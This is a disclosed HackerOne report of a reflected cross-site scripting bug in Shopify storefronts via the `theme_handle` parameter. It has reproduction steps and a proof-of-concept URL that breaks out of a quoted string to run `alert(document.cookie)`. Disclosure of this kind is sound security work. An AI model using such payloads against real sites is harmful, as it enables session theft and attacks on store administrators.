@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/226428
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/zombiehelp54
+ReportedTo:Shopify(shopify)
+BountyAmount:2000.0
+Severity:
+State:Closed
+DateOfDisclosure:29.05.2017 16:06:44
+
+Summary:
+This is a reflected XSS that could be triggered on the storefront of any Shopify store. Our template was missing proper escaping for the `theme_handle` parameter. This issue is severe because it could be exploited by unauthenticated users to attack the admin area of a store, given that the storefront is hosted on the same origin as the admin area of a store.
+Hi,
+I have found a reflected cross site scripting vulnerability in `<any>.myshopify.com` through `theme_hanlde` parameter due to not single quotes.
+
+#Steps to reproduce: 
+1. Navigate to `<account>.myshopify.com` 
+2. view the source of the page and copy the value of `Shopify.theme` Id.
+3. Navigate to `https://echo.myshopify.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=<theme_ID>` 
+> *replace `<theme_ID>` with the ID you just copied*.
+4. XSS will trigger in all of the online shop pages unless you click `Cancel theme preview` .
+
+**PoC:** 
+`https://test.myshopify.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=3572` 
+
+{F182252}
+Thanks!
